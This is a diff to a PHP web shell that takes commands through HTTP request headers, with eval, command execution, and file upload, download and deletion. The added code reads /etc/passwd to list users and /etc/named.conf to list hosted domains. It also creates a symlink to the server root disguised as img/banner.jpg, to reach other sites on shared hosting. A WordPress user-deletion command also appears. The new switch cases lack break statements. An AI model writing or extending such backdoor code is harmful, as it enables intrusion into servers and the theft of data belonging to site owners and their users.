@@ -30,12 +30,18 @@ error_reporting(0);
 	-Functions allowed 
 	-Eval PHP code 
 	-Execute commands directly as in a terminal-like way (it needs system, passthru or other similar function)
+	-List all domains in the server 
+	-List all users in the server 
+	-Detect CMS installed in others domains //TODO
 
 	-Browse between directories
 	-List files/directories
 	-Show source of files 
 	-Download/upload files 
-	-Delete files //TODO
+	-Delete files 
+	
+	-Symlinking 
+
 
 
 */
@@ -319,6 +325,39 @@ function sql_query($query, $db) {
 	}
 	return $data;
 }
+
+function sym_link() {
+	@mkdir("img");
+	$check_sym = @symlink("/","img/banner.jpg");
+	if ($check_sym === TRUE) {
+		echo "YES";
+	} else {
+		echo "NO";
+	}
+}
+
+function server_users() {
+	$users = @file("/etc/passwd");
+	$users_clean = array();
+	if ($users !== FALSE) {
+		for ($i = 0; $i < count($users); $i++) {
+			$ask = explode(":", $users[$i]);
+			$users_clean[] = $ask[0];
+		} 
+		echo implode("\n", $users_clean);
+	} else {
+		echo "ERROR-DA_FCK";
+	}
+}
+
+function domain_list() {
+	$dfile = @file_get_contents("/etc/named.conf");
+	if ($dfile !== FALSE) {
+		preg_match_all('/.*?zone "(.*?)"/', $dfile, $domains);
+		echo implode("\n", $domains);
+	} else { echo "ER#OR"; }
+}
+
 function process_headers() {
 
 	/* Process HTTP Request Headers from client */
@@ -390,6 +429,12 @@ function process_headers() {
 				break;
 			case "wp_delete_user":
 				del_user(base64_decode($commands[1]));
+			case "symlink":
+				sym_link();
+			case "server_users":
+				server_users();
+			case "domain_list":
+				domain_list();
 		}
 	}
 	
